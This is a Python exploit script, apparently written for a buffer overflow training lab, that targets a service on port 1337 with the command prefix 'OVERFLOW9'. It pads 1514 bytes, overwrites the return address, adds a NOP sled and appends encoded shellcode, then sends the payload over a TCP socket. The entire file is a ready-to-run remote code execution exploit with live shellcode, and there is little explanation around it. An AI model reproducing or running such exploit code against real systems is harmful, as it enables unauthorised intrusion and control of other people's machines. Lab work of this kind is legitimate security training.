#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.42.175"
port = 1337

prefix = b"OVERFLOW9 "
offset = 1514
overflow = b"A" * offset
retn = b"\xbb\x11\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)


shellcode = b"\xda\xc3\xbb\x2e\x9b\x47\xa8\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x52\x31\x5a\x17\x83\xea\xfc\x03\x74\x88\xa5\x5d\x74\x46\xab\x9e\x84\x97\xcc\x17\x61\xa6\xcc\x4c\xe2\x99\xfc\x07\xa6\x15\x76\x45\x52\xad\xfa\x42\x55\x06\xb0\xb4\x58\x97\xe9\x85\xfb\x1b\xf0\xd9\xdb\x22\x3b\x2c\x1a\x62\x26\xdd\x4e\x3b\x2c\x70\x7e\x48\x78\x49\xf5\x02\x6c\xc9\xea\xd3\x8f\xf8\xbd\x68\xd6\xda\x3c\xbc\x62\x53\x26\xa1\x4f\x2d\xdd\x11\x3b\xac\x37\x68\xc4\x03\x76\x44\x37\x5d\xbf\x63\xa8\x28\xc9\x97\x55\x2b\x0e\xe5\x81\xbe\x94\x4d\x41\x18\x70\x6f\x86\xff\xf3\x63\x63\x8b\x5b\x60\x72\x58\xd0\x9c\xff\x5f\x36\x15\xbb\x7b\x92\x7d\x1f\xe5\x83\xdb\xce\x1a\xd3\x83\xaf\xbe\x98\x2e\xbb\xb2\xc3\x26\x08\xff\xfb\xb6\x06\x88\x88\x84\x89\x22\x06\xa5\x42\xed\xd1\xca\x78\x49\x4d\x35\x83\xaa\x44\xf2\xd7\xfa\xfe\xd3\x57\x91\xfe\xdc\x8d\x36\xae\x72\x7e\xf7\x1e\x33\x2e\x9f\x74\xbc\x11\xbf\x77\x16\x3a\x2a\x82\xf1\x4f\xa3\xfc\xfc\x38\xb1\xfc\xef\xe4\x3c\x1a\x65\x05\x69\xb5\x12\xbc\x30\x4d\x82\x41\xef\x28\x84\xca\x1c\xcd\x4b\x3b\x68\xdd\x3c\xcb\x27\xbf\xeb\xd4\x9d\xd7\x70\x46\x7a\x27\xfe\x7b\xd5\x70\x57\x4d\x2c\x14\x45\xf4\x86\x0a\x94\x60\xe0\x8e\x43\x51\xef\x0f\x01\xed\xcb\x1f\xdf\xee\x57\x4b\x8f\xb8\x01\x25\x69\x13\xe0\x9f\x23\xc8\xaa\x77\xb5\x22\x6d\x01\xba\x6e\x1b\xed\x0b\xc7\x5a\x12\xa3\x8f\x6a\x6b\xd9\x2f\x94\xa6\x59\x4f\x77\x62\x94\xf8\x2e\xe7\x15\x65\xd1\xd2\x5a\x90\x52\xd6\x22\x67\x4a\x93\x27\x23\xcc\x48\x5a\x3c\xb9\x6e\xc9\x3d\xe8"


#postfix = b""

payload = prefix + overflow + retn + padding + shellcode     #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
